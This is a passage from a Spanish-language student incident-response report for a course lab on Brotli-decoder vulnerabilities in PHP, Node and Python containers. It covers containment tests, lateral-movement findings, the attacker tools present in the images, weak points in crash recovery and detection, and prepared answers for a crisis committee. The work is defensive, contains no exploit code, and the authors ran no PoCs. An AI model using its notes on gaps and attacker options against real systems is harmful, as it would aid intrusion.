| Rechazo de Brotli innecesario | No configurado: `POST /decode` acepta `Content-Encoding: br` | `node/server.js`: `express.raw()` con `inflate` por defecto (`true`). Prueba del control propuesto en una app temporal dentro de `node-lab`, sin tocar `server.js` ([`09`](capturas/09-funcional-antes.txt), prueba G) | **No** en el lab / **Probado** como propuesta | Control propuesto mientras no se parchee: rechazar `br` en el proxy, o en la app con `express.raw({ inflate: false })`. Probado: con `Content-Type` el cuerpo `br` recibe **415** `content encoding unsupported` **antes** del decoder; sin `Content-Type`, body-parser no lee el cuerpo y el handler recibe `undefined`. En ningún caso los bytes llegan al decoder de body-parser. Además hay que **quitar** el `brotliDecompressSync` del handler, que es un segundo camino al decoder. Un filtro dentro del handler llegaría tarde. Costo: `/decode` deja de aceptar Brotli, así que es temporal |

**Prueba de salida a Internet:** las capturas anteriores y posteriores al parche
muestran PHP `SIN SALIDA`, Node `SIN SALIDA TypeError` y Python `SIN SALIDA URLError`.
La observación es que esas solicitudes no obtuvieron respuesta exitosa; los errores
genéricos no identifican por sí solos si falló DNS, TLS, la ruta o el destino.
`internal: true` respalda la intención de aislamiento en la configuración. No se
probó cada protocolo ni se reprodujeron las URLs del log. Para atribuir un bloqueo
a la política harían falta inspección de la red efectiva y trazas del rechazo,
sin habilitar salida a Internet ni alterar la red interna del laboratorio.

**Riesgo residual y límites de lo verificado:**

- Hasta el 30/10, `read_only`, capabilities y límites estaban verificados solo en la
  configuración. El 01/11 se probaron por comportamiento (tabla anterior), antes y
  después del parche con el mismo resultado ([`08`](capturas/08-contencion-pruebas-antes.txt)
  y [`12`](capturas/12-contencion-pruebas-despues.txt)). La prueba de memoria mostró que
  la configuración **no** hace lo que parece: el tope es 256 MB, no 128 MB.
- **Movimiento lateral, medido:** la red interna corta la salida, pero desde `py-lab`
  se obtuvo la respuesta de `http://node-lab:3000/` y desde `node-lab`, `HTTP 200` de
  `http://php-lab/` ([`08`](capturas/08-contencion-pruebas-antes.txt) §7). Cualquier
  servicio comprometido llega a los otros dos. Es la ruta que haría falta para la
  hipótesis de svc01; el log no demuestra que se haya usado.
- **Herramientas disponibles para un atacante, medidas:** las tres imágenes traen
  `sh`, `bash` y `perl`; `php-lab` además trae `curl`; ninguna trae `wget` ni `nc`
  ([`08`](capturas/08-contencion-pruebas-antes.txt) §8). Imágenes mínimas (sin shell)
  harían fallar la cadena `servicio → sh → descargador`; no se proponen para el lab.
- **Disponibilidad: los controles no evitan la caída.** Según la cátedra, un intento
  fallido de Node2Shell igual crashea el proceso (DoS sin autenticación). Ninguno de
  los controles de la tabla lo impide: limitan lo que hace un atacante **después** de
  ejecutar código, no que el decoder tire el proceso. Los tres servicios tienen
  `restart: on-failure:3` en `docker-compose.yml`, así que Docker reintenta cuando el
  proceso termina con error, pero hasta 3 veces; después lo deja caído. Con esa
  política, unos pocos pedidos maliciosos bastarían para dejar la API fuera de servicio
  hasta que alguien intervenga. Y si el que se reinicia es `php-lab`, el reinicio
  automático borra `access.log` igual que el manual (`deteccion.md` §5). **No lo
  probamos:** habría que crashear `node` a propósito, y no ejecutamos PoCs. Lo que sí
  mitiga la caída es lo que corta el camino al decoder: el parche o el rechazo de
  Brotli (fila anterior). En producción, además, alertar por reinicios y por
  contenedores en estado `exited`, porque un reinicio automático exitoso esconde el
  crash a quien solo mira el healthcheck.
- El master de Apache corre como root con 5 capabilities. Los workers que procesan
  las peticiones no las tienen (probado), pero un escape del worker al master tendría
  más superficie; el log sintético no mide ataques sobre ese contenedor.

**Kernel del entorno Docker: alcance pendiente.** El contexto de la cátedra incluye
PHP2Shell + Fragnesia (CVE-2026-46300), una cadena hacia privilegios elevados. No se
relevó el kernel del equipo del taller (29/10). En el entorno de la re-ejecución
(01/11) se inventarió: Docker Desktop, kernel de la VM del motor
**`6.10.14-linuxkit`, aarch64**; los contenedores comparten ese kernel
([`16`](capturas/16-kernel-y-arquitectura.txt)). Que haya versión no resuelve la
aplicabilidad, que sigue **indeterminada**: no contrastamos esa versión con las
afectadas por Fragnesia ni con las correcciones del proveedor, y no se deduce del
sistema operativo del equipo ni de las versiones PHP/Node. Infraestructura debe inventariar versión,
configuración y correcciones del proveedor durante la primera jornada, y seguridad
evaluar el host antes de cerrar el riesgo. No se ejecutan PoCs ni se supone que
este entorno esté afectado. Un usuario sin privilegios y un filesystem read-only
no demuestran resistencia a una vulnerabilidad del kernel; actualizar PHP no
corrige por sí solo ese componente. Si hay evidencia de compromiso del host, la
recuperación debe abarcarlo, no solo reconstruir contenedores.

**Control extra propuesto para producción:** segmentar los servicios y permitir
solo las comunicaciones necesarias, con reglas efectivas entre segmentos. Reduce
el movimiento lateral, sin garantizar que todo acceso interno sea legítimo.
No se propone modificar la red interna ni publicar puertos del laboratorio.

---

## 6. Conclusión (5 líneas)

1. En las primeras 2 horas, si hay señales de compromiso, aislaríamos y
   preservaríamos evidencia antes de parchear. Entre los parches, PHP va primero:
   la mitigación es un cambio de configuración y no reemplaza la actualización.
2. Inventariaríamos dependencias transitivas y proxies, no solo runtimes: Brotli llega
   por Node, Express, `fetch` y Envoy aunque nadie lo importe.
3. Usaríamos la versión del runtime como evidencia, no el string de Brotli, que no
   cambia con el parche.
4. Cazaríamos desde el 17/10 y no desde el disclose, y declararíamos db01 como activo
   sin relevar.
5. Probaríamos antes el pipeline de build: la intercepción de HTTPS en el equipo nos
   frenó el arranque y el parche, y en una emergencia eso es tiempo perdido.

---

## 7. Preparación del comité de crisis

Respuestas preparadas para las preguntas de [`docs/comite.md`](../../docs/comite.md),
apoyadas en la evidencia de las secciones anteriores.

**Mensaje de apertura (2 min).** El 21/10 se publicaron dos fallas que afectan a
nuestros tres sistemas. Una, en el portal de legajos, ya se usa para atacar
organizaciones reales. Para Node2Shell, el contexto actualizado de la cátedra también
informa explotación y KEV. En el escenario del ejercicio, el log sintético del
27/10 muestra procesos anómalos: proponemos tratarlos como incidente presunto y
validar su alcance, sin afirmar una intrusión real en el laboratorio. **Pedimos dos
decisiones:** autorización para aislar hoy los tres servicios afectados y una ventana
de emergencia para actualizar portal, API y Python en menos de 24 horas; además,
relevamiento del kernel antes de dar el riesgo por cerrado.

| # | Pregunta | Respuesta | Evidencia |
|---|---|---|---|
| 1 | ¿Parcheamos en caliente facturación sin entorno de pruebas? | No a ciegas, pero tampoco esperamos. Ahora: mitigación de una línea, reversible en segundos. El mismo día: respaldo, ventana corta, actualización y una operación de prueba (emitir una factura de prueba). La reversión requiere imagen limpia, aislamiento y aceptación del riesgo residual; no se reabre una versión vulnerable por el solo hecho de recuperar disponibilidad. Con una falla en KEV, el riesgo de no parchear es mayor | §3: mitigación y reversión de PHP; parche en segundos por servicio |
| 2 | El hosting no actualiza PHP hasta el viernes. ¿Qué compensamos? | Hasta el viernes: (a) `upload_progress = 0`; (b) restringir quién llega al portal (VPN o lista de IPs, si el uso lo permite); (c) bloquear la salida a Internet del servidor; (d) alerta por procesos hijos de `apache2`. Verificación: valor del `.ini`, prueba de salida que falla y regla contrastada documentalmente con `audit.log`, sin despliegue de alertas. El dueño del portal firma la aceptación del riesgo residual hasta el viernes | §3, §5 (`SIN SALIDA`), `deteccion.md` §4 |
| 3 | Pregunta actualizada por la cátedra: «Node2Shell está en KEV pero el exploit público visto en el mundo real falla. ¿Justifica una ventana de emergencia? ¿Con qué evidencia cambiarías la decisión?» | **Sí, la justifica.** Que el exploit público esté roto no nos protege por tres motivos. (1) Ya hay RCE logrado por otros: ELLIO lo consiguió en cuatro configuraciones y Imperva lo demostró en laboratorio; un atacante con un exploit propio no depende del público. (2) Aunque falle, el intento **tira la API**: cada falla crashea el proceso, o sea que es una caída sin necesidad de usuario. En nuestro compose, después de 3 caídas Docker deja de reiniciarla (§5). (3) Está en KEV con vencimiento el 10/11. Proponemos actualizar la API en **< 24 h** y, hasta entonces, rechazar Brotli antes del decoder (probado como propuesta, §5). Python comparte plazo por el componente y las señales del escenario. **Qué nos haría cambiar la decisión:** bajaríamos a ventana ordinaria (antes del 10/11) solo si se probara que ningún cliente llega al decoder: proxy que descarta `Content-Encoding: br` delante de la API, verificado con un pedido benigno que reciba 415 o 400 antes de body-parser, y que la API no descomprima respuestas de terceros (hoy `server.js` no usa `fetch`; si lo agregara, `fetch` descomprime `br` solo). Al revés, cualquier reinicio sin causa operativa o un error `Decompression failed` en ráfaga (`deteccion.md` §4) lo pasa de vulnerabilidad a incidente: aislar primero | §2; §5 (rechazo de Brotli, `restart`); contexto de la cátedra (ELLIO, Imperva, KEV); `deteccion.md` §2.2 y §4 |
| 4 | ¿Qué le decimos a clientes y cuándo? | Cuando tengamos el alcance mínimo y la contención en marcha, sin esperar a cerrar la investigación. Mensaje inicial: investigamos actividad sospechosa, indicamos únicamente las medidas realmente aplicadas y fijamos la próxima actualización. No se afirma que la actividad fue contenida ni que hubo acceso a datos sin confirmación. Nunca: versiones, qué falta parchear, IPs ni vector. Como el portal guarda datos personales, legales evalúa si hay obligación de notificar según la normativa de protección de datos personales (en Argentina, Ley 25.326). Esa obligación no la verificamos nosotros | No aplica: es una decisión de legales y comunicación, no una afirmación técnica |
| 5 | Si el atacante usa un agente para post-explotación, ¿qué sigue funcionando? | Lo que no depende del perímetro, y lo probamos uno por uno: el agente no puede pedir instrucciones afuera (la salida a Internet falla), no puede dejar archivos en el código ni correr un programa bajado a `/tmp`, no es administrador del contenedor (en PHP, el proceso que atiende pedidos tampoco) y no puede lanzar procesos sin límite. Lo que **no** frena, también medido: puede hablar con los otros dos servicios de la red interna y puede usar las herramientas que ya trae cada servidor (`sh`, `perl`, `curl` en el portal). Por eso pedimos segmentar en producción. La regla detecta hijos de Node de su lista, pero no ejecución en memoria (`deteccion.md` §4) | §5 (pruebas del 01/11), `deteccion.md` §2.1 y §4 |
| 6 | ¿Qué nos hace pasar de "monitorear" a "apagar"? | Ejecución de comandos desde un servicio (representada en el log sintético del 27/10), conexiones salientes exitosas, acceso no explicado a db01 o señales de exfiltración. Con la primera ya corresponde **aislar**, que es lo que pedimos autorizar en la apertura. Apagar destruye la memoria, que es evidencia: preferimos cortar la red y apagar solo si aislar no alcanza | `deteccion.md` §2 |
| 7 | El CERT avisa un martes a las 9:40. ¿Qué hacemos primero? | 9:40–10:00: ¿tenemos el producto?, ¿dónde?, ¿expuesto? (inventario, incluidas las dependencias que vienen dentro de otros componentes). 10:00–11:00: mitigación reversible en lo expuesto y búsqueda en los logs **desde antes** del aviso. Antes del mediodía: dueños, ventana y mensaje interno. Un responsable por tarea | §1, §6 |
| 8 | ¿Cómo sabemos que el parche quedó y que la app funciona? | Dos pruebas distintas. **Quedó:** la versión del runtime (8.3.36, v22.23.4, brotli 1.2.1), no el string Brotli de Node, que no cambia. **Funciona:** repetimos las mismas operaciones antes y después (portal con subida de archivo, API y servicio interno con contenido real) y dieron igual. También probamos volver atrás: tarda segundos. Eso **no** certifica el kernel ni descarta que un atacante haya quedado adentro: para eso hace falta evaluar el host y buscar persistencia antes del cierre | §3 (pruebas A–E y ensayo de reversión del 01/11); [`06`](capturas/06-parche-despues.txt), [`11`](capturas/11-funcional-despues.txt) |

---

## 8. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
- [x] Inventario con evidencia (versión, SAPI, configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada.
- [x] Controles de contención documentados con su alcance de verificación (§5).
- [x] Pruebas de comportamiento de al menos tres controles: read-only, usuario, capabilities, PIDs y memoria, el 01/11 (§5), posteriores al taller.
- [x] `deteccion.md` completo.
- [x] `informe.md` de Lorenzo existente; no acredita la entrega individual de los demás integrantes.
- [x] Sin claves, tokens ni placeholders.
- [ ] Repo pusheado y PR abierto.

Checklist completa: [`../../docs/checklist-entrega.md`](../../docs/checklist-entrega.md).
